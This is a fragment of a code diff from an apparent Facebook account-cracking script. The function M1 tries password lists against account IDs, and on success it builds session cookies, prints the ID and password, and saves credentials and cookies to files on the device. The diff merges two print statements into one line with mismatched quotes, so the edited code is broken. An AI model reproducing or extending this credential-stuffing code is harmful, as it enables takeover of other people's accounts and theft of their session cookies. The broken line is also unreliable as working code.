@@ -655,8 +655,7 @@ def M1(ids,names,passlist):
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"                                	
-                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m') 
-					print('\r\r\x1b[1;91m [cookie]: '+cookie+'f"sb={ssbb};{ckkk}')
+                                        print('\r\r\033[1;32m [HANDSOME-OK] '+ids+' | '+pas+'\033[1;97m' | '+cookie)
                                         open('/sdcard/HANDSOMEYY_OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/HANDSOMEYY_COOKiE_M1.txt','a').write(ids+'|'+pas+'|'+cookie+'\n')
                                         HANDSOME(ids,pas,cookie)
                                         oks.append(ids)
